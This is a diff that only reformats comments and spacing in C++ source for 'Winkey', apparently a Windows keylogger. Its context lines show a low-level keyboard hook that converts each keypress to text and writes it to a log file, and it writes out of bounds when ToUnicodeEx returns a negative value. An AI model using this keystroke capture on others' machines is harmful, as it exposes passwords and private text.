@@ -85,31 +85,32 @@ void CALLBACK Winkey::WinEventProc(
 }
 
 /*
-* Low-level keyboard hook callback.
-*
-* @param   nCode   Code the system passes to the hook procedure to indicate
-*                  the action to be taken.
-* @param   wParam  The message type.
-* @param   lParam  Points to a KBDLLHOOKSTRUCT structure that contains detailed
-*                  information about the keyboard event (which key, scan code,
-*                  flags, etc.).
-* 
-* @return  CallNextHookEx
-*          - LRESULT is a Windows data type used for return values from
-*              window procedures and hook functions.
-*          - CALLBACK is a macro defining the calling convention of the function
-*              (specifies how parameters are passed and who cleans the stack).
-*/
+ * Low-level keyboard hook callback.
+ *
+ * @param   nCode   Code the system passes to the hook procedure to indicate
+ *                  the action to be taken.
+ * @param   wParam  The message type.
+ * @param   lParam  Points to a KBDLLHOOKSTRUCT structure that contains detailed
+ *                  information about the keyboard event (which key, scan code,
+ *                  flags, etc.).
+ * 
+ * @return  CallNextHookEx
+ *          - LRESULT is a Windows data type used for return values from
+ *              window procedures and hook functions.
+ *          - CALLBACK is a macro defining the calling convention of the function
+ *              (specifies how parameters are passed and who cleans the stack).
+ */
 
 LRESULT CALLBACK Winkey::LowLevelKeyboardProc(
     const int nCode, const WPARAM wParam, const LPARAM lParam
 )
 {
     /*
-    * HC_ACTION        Process the event normally.
-    * WM_KEYDOWN       Key pressed
-    * WM_SYSKEYDOWN    System key pressed (like ALT)
-    */
+     * HC_ACTION        Process the event normally.
+     * WM_KEYDOWN       Key pressed
+     * WM_SYSKEYDOWN    System key pressed (like ALT)
+     */
+
     if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
     {
         static DWORD            LastVkCode = 0;
@@ -126,8 +127,8 @@ LRESULT CALLBACK Winkey::LowLevelKeyboardProc(
 
         LastVkCode = p->vkCode;
 
-        BYTE                    keyboardState[256];
-        WCHAR                   buffer[5] = {};
+        BYTE    keyboardState[256];
+        WCHAR   buffer[5] = {};
 
         // Get the current state of all keys
         GetKeyboardState(keyboardState);
@@ -135,29 +136,31 @@ LRESULT CALLBACK Winkey::LowLevelKeyboardProc(
         const HKL layout = GetKeyboardLayout(0);
         
         /*
-        * Converts the virtual key code (vkCode) and scan code into the
-        *  corresponding Unicode character(s)
-        * 
-        * vkCode:
-        *  - A Windows-defined constant that identifies a logical key,
-        *      like "A", "Shift", "Enter", "F1", etc.
-        *  - Same across keyboards: for example, VK_A always refers to the A key,
-        *      no matter where it is on the keyboard.
-        * 
-        * scanCode:
-        *  - A hardware-generated code from the keyboard itself.
-        *  - Represents the physical location of the key on the keyboard.
-        */
+         * Converts the virtual key code (vkCode) and scan code into the
+         *  corresponding Unicode character(s)
+         * 
+         * vkCode:
+         *  - A Windows-defined constant that identifies a logical key,
+         *      like "A", "Shift", "Enter", "F1", etc.
+         *  - Same across keyboards: for example, VK_A always refers to the A key,
+         *      no matter where it is on the keyboard.
+         * 
+         * scanCode:
+         *  - A hardware-generated code from the keyboard itself.
+         *  - Represents the physical location of the key on the keyboard.
+         */
 
         int result = ToUnicodeEx(
             p->vkCode, p->scanCode, keyboardState, buffer, 4, 0, layout
         );
         buffer[result] = L'\0'; // Null-terminate
 
-        /* Log character to file or, if no valid character was produced
-        *  (like arrow keys, function keys), log a fallback string that includes
-        *  the virtual key code.
-        */
+        /* 
+         * Log character to file or, if no valid character was produced
+         *  (like arrow keys, function keys), log a fallback string that includes
+         *  the virtual key code.
+         */
+
         if (result > 0) _logFile << buffer;
         else _logFile << GetKeyName(p->vkCode);
 
